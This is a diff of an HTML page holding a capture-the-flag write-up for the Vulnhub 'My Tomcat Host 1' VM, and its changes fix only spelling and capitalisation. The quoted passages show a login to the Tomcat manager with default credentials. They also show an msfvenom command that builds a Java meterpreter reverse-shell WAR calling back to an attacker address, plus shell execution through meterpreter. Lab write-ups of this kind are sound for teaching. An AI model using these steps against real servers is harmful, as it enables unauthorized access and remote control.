@@ -15,7 +15,7 @@
             This VM was created by <a href="https://twitter.com/akankshavermasv">Akanksha Sachin Verma</a>. I saw it on Vulnhub and was able to get through it fairly quickly.  It helped that I was familiar with the initial exploitation vector.  The VM came packaged configured for 4GB, but I dropped it down to 2GB without significant performance issues.  The VM can be downloaded:<a href="https://www.vulnhub.com/entry/my-tomcat-host-1,457/">here</a>.
         </p>
         <p class="text">
-            First, I ran my (bash) enumeration script and exacmined the nmap scan.  I've updated this a bit and it has turned out nicely.  Now, it echoes the open ports that are found.  Pretty nice, huh?
+            First, I ran my (bash) enumeration script and examined the nmap scan.  I've updated this a bit and it has turned out nicely.  Now, it echoes the open ports that are found.  Pretty nice, huh?
         </p>
         <pre>
     root@kali:~/Documents/mytomcathost# ../scripts/enum-automation.sh 192.168.0.123
@@ -48,7 +48,7 @@
     root@192.168.0.123: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
         </pre>
         <p class="text">
-            Other than that, then I started focusing on the Tomcat Server.  Before even looking at the results of dirb and nikto, I navigated to the Tomcat landing page at port 8080 (TCP) and attempted to log into the Tomcat manager portal located at /manager/html.  Typically, I don't like brute-forcing so early in the assessment, but for Tomcat, I make an exception.  I've seen username/password combinations such as admin:admin, tomcat:tomcat, manager:manager, tomcat:manager, and a few others.  I tried these immediately because of the high-value target that I know lies behind the basic authentication.  Sure enough, tomcat:tomcat authenticated me to the machine.  This gave me the traditional Tomcat manager portal, where I could upload my own servlet in the form of a WAR file (which is basically a Java archive / zip file).  Fun fact: you can unpack a war with the "unzip" utility.  I used a relatively new addition to the metasploit framework, which is a Java-targeted meterpreter shell, which is pretty handy when you're not sure whether the host is Windows or Linux-based (this can be hard when the host is behind a load balancer or firewall).  
+            Other than that, then I started focusing on the Tomcat Server.  Before even looking at the results of dirb and nikto, I navigated to the Tomcat landing page at port 8080 (TCP) and attempted to log into the Tomcat manager portal located at /manager/html.  Typically, I don't like brute-forcing so early in the assessment, but for Tomcat, I make an exception.  I've seen username/password combinations such as admin:admin, tomcat:tomcat, manager:manager, tomcat:manager, and a few others.  I tried these immediately because of the high-value target that I know lies behind the basic authentication.  Sure enough, tomcat:tomcat authenticated me to the machine.  This gave me the traditional Tomcat manager portal, where I could upload my own servlet in the form of a WAR file (which is basically a Java archive / zip file).  Fun fact: you can unpack a war with the "unzip" utility.  I used a relatively new addition to the Metasploit framework, which is a Java-targeted meterpreter shell, which is pretty handy when you're not sure whether the host is Windows or Linux-based (this can be hard when the host is behind a load balancer or firewall).  
         </p>
         <pre>
     root@kali:~/Documents/mytomcathost# msfvenom -p java/meterpreter/reverse_tcp LHOST=192.168.0.122 LPORT=443 -f war -o msf443.war
@@ -160,7 +160,7 @@
     exit
         </pre>
         <p class="text">
-            This gave us a very important clue.  It appears that the user tomcat can possibly execute some commands (java, maybe?) as root.  I can't execute interactive commands without spawning a bash shell so next I tried to do just that.  Let's get interactive!  I tried for a bit to generate an SSH key and/or add my own to a ".ssh/authorized_keys" folder, but was unable to grab an interactive shell through SSH.  Then, I tried the next best thing.
+            This gave us a very important clue.  It appears that the user tomcat can possibly execute some commands (Java, maybe?) as root.  I can't execute interactive commands without spawning a bash shell so next I tried to do just that.  Let's get interactive!  I tried for a bit to generate an SSH key and/or add my own to a ".ssh/authorized_keys" folder, but was unable to grab an interactive shell through SSH.  Then, I tried the next best thing.
         </p>   
         <pre>
     meterpreter > execute -f bash -i -H "whoami"
